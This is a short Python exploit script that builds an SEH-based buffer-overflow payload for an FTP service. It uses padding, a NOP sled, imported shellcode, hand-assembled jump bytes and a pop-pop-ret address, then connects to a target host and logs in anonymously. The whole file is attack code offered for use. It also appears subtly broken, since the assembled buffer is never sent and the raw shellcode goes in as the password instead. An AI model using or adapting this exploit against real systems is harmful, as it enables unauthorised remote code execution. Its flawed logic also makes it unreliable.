#!/usr/bin/python
from payload import buf
import socket
from ftplib import FTP

def shell_attack(target_machine, target_port):


  

    buffer = b'A' * 276
    buffer += b'\x90' * 10
    buffer += buf
    buffer += b'B' * (486 - len(buf))
    buffer += b'\x58' # pop eax
    buffer += b'\xfe\xcc' # dec ah
    buffer += b'\xfe\xcc' # dec ah
    buffer += b'\xff\xe0' # jmp eax
    buffer += b'C' * 4
    buffer += b'\xe8\xf0\xff\xff\xff' # call near
    buffer += b'D' * 9
    buffer += b'\xeb\xf0\x90\x90' # jump backwards
    buffer += b'\xc0\x3d\x42\x00' # 0x00423dc0 - pop, pop, ret
    buffer += b'E' * (1000 - len(buf))
    ftp = FTP()
    ftp.connect(target_machine, target_port)
    ftp.login(b'anonymous', buf)
    ftp.close()